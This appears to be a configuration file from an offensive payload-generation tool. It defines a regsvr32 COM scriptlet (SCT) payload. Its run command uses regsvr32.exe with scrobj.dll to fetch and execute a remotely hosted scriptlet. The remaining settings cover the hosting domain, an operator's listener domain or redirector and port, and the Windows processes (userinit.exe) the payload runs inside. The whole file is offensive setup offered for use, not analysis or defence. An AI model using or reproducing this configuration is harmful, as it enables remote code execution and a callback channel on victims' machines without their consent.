[Type]
name: regsvr32
info: COM Scriptlet (SCT) using regsvr32.exe
template: ./template/SCT/regsvr32.template
runInfo: regsvr32.exe /u /n /i:${Output:var} scrobj.dll

[HostedDomain]
var: http://127.0.0.1
allowWilds: True
help: The domain, IP, or path of your Hosted SCT

[ListenerDomain]
var: 127.0.0.1
allowWilds: True
help: Your listener domain or IP, can be a redirector

[ListenerPort]
var: 80
allowWilds: True
forceInteger: True
help: Your listener port

[Processx86]
var: userinit.exe
allowWilds: True
help: May be any .exe in //System32/

[Processx64]
var: userinit.exe
allowWilds: True
help: May be any .exe in //SysWOW64/

[Output]
var: regsvr32.sct
allowWilds: True